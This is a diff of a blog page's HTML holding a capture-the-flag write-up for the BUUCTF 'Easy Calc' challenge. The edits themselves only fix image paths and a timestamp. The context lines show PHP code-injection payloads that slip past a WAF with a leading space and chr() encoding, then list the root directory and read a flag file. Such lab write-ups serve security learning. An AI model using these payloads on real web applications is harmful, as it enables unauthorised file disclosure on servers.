@@ -87,10 +87,10 @@
 <meta property="og:site_name" content="diao-diao-UPUP">
 <meta property="og:description" content="Easy Calc打开环境是个计算器，搜索一下Calc是什么 最后发现是CSS中的一个样式，用于进行一下计算http:&#x2F;&#x2F;caibaojian.com&#x2F;css3-calc.html 尝试一下注入 1234输入1 正常1’ 没有报错1&amp;apos;# 直接给PASS了 到这里考虑不是SQL注入题 crtl+u看一下源码 看到作者给了提示 写了WAF保障安全 WAF： 12345678910111213">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;BUUCTF%5CEasy_Calc&#x2F;0.png">
-<meta property="og:updated_time" content="2020-01-21T03:06:06.512Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;BUUCTF&#x2F;Easy_Calc&#x2F;0.png">
+<meta property="og:updated_time" content="2020-01-25T02:50:30.801Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;BUUCTF%5CEasy_Calc&#x2F;0.png">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;BUUCTF&#x2F;Easy_Calc&#x2F;0.png">
 
 
 
@@ -363,7 +363,7 @@
 <p>所以在num变量前加个空格来让WAF识别不到  并且用char()进行转义</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=1;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/BUUCTF%5CEasy_Calc/0.png" alt="avatar"></p>
+<p><img src="/images/BUUCTF/Easy_Calc/0.png" alt="avatar"></p>
 <p>找到flagg目录</p>
 <p>那就继续读取 使用file_get_contents</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>
